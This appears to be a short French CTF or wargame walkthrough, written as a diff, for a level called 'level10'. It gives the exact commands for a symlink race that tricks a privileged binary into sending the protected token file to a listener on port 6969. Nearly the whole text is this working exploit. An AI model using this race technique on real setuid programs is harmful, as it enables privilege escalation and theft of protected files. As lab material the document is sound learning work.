@@ -1,0 +1,5 @@
+lancer irc sur le port 6969
+
+lancer un 2eme terminal avec ```while true; do echo "coucou" >/tmp/machin; ln -sf /home/user/level10/token /tmp/tkn; ln -sf /tmp/machin /tmp/tkn; done```
+
+avec le 1er terminal spam ```./level10 /tmp/tkn {IP LOCAL}```
